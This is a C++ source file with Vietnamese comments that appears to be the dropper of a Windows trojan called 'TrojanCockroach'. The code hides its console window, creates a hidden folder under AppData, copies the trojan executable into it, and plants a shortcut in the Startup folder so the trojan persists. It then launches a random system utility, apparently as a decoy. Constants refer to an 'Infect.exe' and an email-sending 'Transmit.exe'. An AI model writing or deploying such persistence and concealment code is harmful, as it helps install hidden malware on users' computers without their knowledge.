#include <iostream>
#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <cstring>

#define FOLDER_NAME "trojanCockroach"  // Tên thư mục chứa
#define RUN_FILE_NAME "TrojanCockroach.exe"  // Tên tệp thực thi chính
#define RUN_LINK_NAME "TrojanCockroach.lnk"  // Tên liên kết khởi động
#define INFECT_FILE_NAME "Infect.exe"  // Tên tệp thực thi lây nhiễm
#define INFECT_LINK_NAME "Infect.lnk"  // Tên liên kết lây nhiễm
#define EMAIL_SENDER_FILE_NAME "Transmit.exe"  // Tên tệp thực thi gửi email

int main() {
    // Ẩn cửa sổ console
    FreeConsole();

    // Lấy đường dẫn đến thư mục AppData của người dùng
    char appdataFolder[MAX_PATH];
    if (!GetEnvironmentVariable("APPDATA", appdataFolder, MAX_PATH)) {
        std::cerr << "Failed to get AppData folder path." << std::endl;
        return 1;
    }

    // Tạo đường dẫn đầy đủ đến thư mục chứa
    char folderPath[MAX_PATH];
    snprintf(folderPath, MAX_PATH, "%s\\%s", appdataFolder, FOLDER_NAME);

    // Tạo thư mục chứa
    if (!CreateDirectory(folderPath, NULL)) {
        std::cerr << "Failed to create folder: " << folderPath << std::endl;
        return 1;
    }

    // Đặt thuộc tính ẩn cho thư mục
    SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);

    // Sao chép các tệp và liên kết tới thư mục chứa
    char runFrom[MAX_PATH], runTo[MAX_PATH];
    snprintf(runFrom, MAX_PATH, "%s\\%s", FOLDER_NAME, RUN_FILE_NAME);
    snprintf(runTo, MAX_PATH, "%s\\%s", folderPath, RUN_FILE_NAME);
    if (!CopyFile(runFrom, runTo, FALSE)) {
        std::cerr << "Failed to copy file: " << runFrom << std::endl;
        return 1;
    }

    // Làm tương tự cho các tệp và liên kết khác...

    // Sao chép liên kết của tệp TrojanCockroach.exe vào thư mục tự khởi động
    char startupLink[MAX_PATH];
    snprintf(startupLink, MAX_PATH, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s", appdataFolder, RUN_LINK_NAME);
    if (!CopyFile(RUN_LINK_NAME, startupLink, FALSE)) {
        std::cerr << "Failed to copy startup link." << std::endl;
        return 1;
    }

    // Ngẫu nhiên mở các tiện ích hệ thống
    srand(time(NULL));
    int random = rand();

    if (random % 5 == 0) {
        system("start taskmgr /Performance");
    } else if (random % 3 == 0) {
        system("start diskmgmt");
    } else if (random % 2 == 0) {
        system("start perfmon /res");
    } else {
        system("start calc");
    }

    return 0;
}
